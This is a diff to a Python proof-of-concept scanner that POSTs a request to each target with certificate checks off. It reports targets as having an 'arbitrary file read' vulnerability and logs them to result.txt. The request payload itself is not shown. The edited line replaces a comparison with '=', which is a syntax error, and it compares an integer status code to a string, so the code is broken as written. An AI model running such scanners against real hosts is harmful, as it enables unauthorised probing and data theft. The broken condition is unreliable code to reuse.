@@ -54,7 +54,7 @@ def poc(target):
     try:
         response1 = requests.post(url, headers=headers, data=data,verify=False, timeout=15)
         # print(response1.text)
-        if response1.status_code != "200" and len(response1.text) > 10000:
+        if response1.status_code = "200" and len(response1.text) > 10000:
             print(f"[++++++] {target} 存在 任意文件读取")
             with open("result.txt", "a+", encoding="utf-8") as f:
                 f.write(target + "\n")
